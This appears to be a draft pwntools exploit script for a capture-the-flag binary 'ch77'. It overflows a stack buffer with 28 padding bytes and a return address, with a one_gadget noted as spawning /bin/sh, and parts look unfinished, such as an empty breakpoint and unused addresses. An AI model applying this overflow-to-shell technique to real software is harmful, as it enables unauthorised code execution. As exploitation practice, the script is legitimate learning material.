from pwn import *

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
binary = ELF("./ch77")
#libc = ELF("")
#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}


p = process("./ch77")
p = gdb.debug("./ch77",'''
break *main
break *0x804844d
break * ''')

read =  0x0804844d
system = read + 4023534563
ret2libc = read - 272


# 0x1487fb execl("/bin/sh", eax)
one_gadget = 0xf7e84a3b

payload = ''
payload += "A" * 28
payload += p32(0x080482c6)

p.sendline(payload)
p.interactive()
